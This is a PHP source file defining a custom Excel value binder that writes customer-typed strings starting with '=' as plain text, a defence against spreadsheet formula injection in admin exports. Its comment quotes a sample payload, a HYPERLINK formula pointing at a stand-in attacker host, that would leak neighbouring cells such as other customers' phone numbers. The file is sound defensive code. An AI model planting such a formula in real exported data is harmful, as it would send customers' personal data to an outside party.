<?php

namespace App\Support;

use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

/**
 * The value binder every Excel export uses (set in AppServiceProvider).
 *
 * PhpSpreadsheet's default stores any string that starts with "=" as a live
 * formula. The admin exports carry text customers typed themselves - a guest
 * checkout's name, an address, a review - so a guest named
 * =HYPERLINK("https://evil.example/?"&C2,"View") became a working link in
 * staff's copy of Excel, one click away from sending the neighbouring cells
 * (other customers' phone numbers) off-site.
 *
 * No export here builds formulas on purpose, so such strings are written as
 * plain text. Everything else - numbers, dates, leading-zero phone numbers -
 * keeps the default typing, so report totals still add up in Excel.
 */
class SafeExcelValueBinder extends DefaultValueBinder
{
    public function bindValue(Cell $cell, $value): bool
    {
        if (is_string($value) && str_starts_with($value, '=')) {
            $cell->setValueExplicit($value, DataType::TYPE_STRING);

            return true;
        }

        return parent::bindValue($cell, $value);
    }
}
